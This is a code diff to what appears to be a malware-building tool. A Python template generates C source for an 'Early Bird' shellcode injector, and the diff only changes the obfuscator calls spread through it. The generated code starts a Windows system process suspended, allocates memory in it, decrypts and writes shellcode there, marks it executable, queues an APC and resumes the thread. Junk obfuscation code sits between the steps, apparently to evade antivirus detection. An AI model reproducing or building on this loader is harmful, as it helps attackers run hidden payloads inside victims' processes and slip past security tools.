@@ -10,7 +10,7 @@ def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,xor_func,key_var,
             if (!executed)
             {{
                 
-                {obfuscator(secrets.choice(array),secrets.choice(size))}
+                {obfuscator(secrets.choice(array),secrets.choice(size),1)}
                 
                 executed = TRUE;
 
@@ -18,7 +18,7 @@ def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,xor_func,key_var,
                 SIZE_T allocation_size = sizeof({shellcode_var});
                 NTSTATUS status = NULL;
                 
-                {obfuscator(secrets.choice(array),secrets.choice(size))}
+                {obfuscator(secrets.choice(array),secrets.choice(size),1)}
                 
                 allocation_start = nullptr;
 
@@ -27,7 +27,7 @@ def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,xor_func,key_var,
                 STARTUPINFOA si = {{ 0 }};
                 PROCESS_INFORMATION pi = {{ 0 }};
                 
-                {obfuscator(secrets.choice(array),secrets.choice(size))}
+                {obfuscator(secrets.choice(array),secrets.choice(size),1)}
                 
                 CreateProcessA("C:\\\\Windows\\\\system32\\\\{process_to_inject}", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
                 HANDLE victimProcess = pi.hProcess;
@@ -57,7 +57,7 @@ def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,xor_func,key_var,
                 // Allocate Virtual Memory 
                 NtAllocateVirtualMemory(victimProcess, &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                 
-                {obfuscator(secrets.choice(array),secrets.choice(size))}
+                {obfuscator(secrets.choice(array),secrets.choice(size),1)}
               
                {Choose_Decryption(encryption_type,xor_func,shellcode_var,key_var)}
 
@@ -65,12 +65,12 @@ def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,xor_func,key_var,
                 NtWriteVirtualMemory(victimProcess, allocation_start, {shellcode_var}, sizeof({shellcode_var}), 0);
                 NtProtectVirtualMemory(victimProcess, &allocation_start, (PSIZE_T)&allocation_size, PAGE_EXECUTE_READ, &oldProtect);
                 
-                {obfuscator(secrets.choice(array),secrets.choice(size))}
+                {obfuscator(secrets.choice(array),secrets.choice(size),1)}
                 
                 NtQueueApcThread(threadHandle, PKNORMAL_ROUTINE(allocation_start), allocation_start, NULL, NULL);
                 NtResumeThread(threadHandle, NULL);
                 
-                {obfuscator(secrets.choice(array),secrets.choice(size))}
+                {obfuscator(secrets.choice(array),secrets.choice(size),1)}
                 
                 return 0;
             }}
